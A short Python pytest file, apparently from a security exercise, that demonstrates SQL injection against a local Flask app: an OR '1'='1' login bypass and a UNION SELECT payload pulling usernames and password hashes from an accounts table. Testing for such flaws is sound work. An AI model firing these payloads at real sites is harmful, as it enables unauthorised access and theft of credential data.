#! /usr/bin/python
"""
test_act5.y
a test case to demonstrate the SQL vulnerabilities
"""
import sys, requests, pytest, json
HOST = "http://127.0.0.1"
s = requests.session()
def test_blind_sql():
    username = "brendy\' OR \'1\'=\'1"
    password = 'flask'
    s.auth = (username, password)
    creds = {'username' : username, 'password' : password}
    r = s.post(f"{HOST}/login", creds)
    print(f"r: {r}, s: {s}", flush=True)
    assert r.status_code == 200
    print(r.url)
    assert r.url == f"{HOST}/"
    
def test_classic_sql():
    sql = "xxx\' UNION SELECT username, userID, pass_hash, username FROM accounts WHERE username != \'"
    data = {'' : sql}
    r = s.post(f"{HOST}/search", data=data)
    #assert r.status_code == 200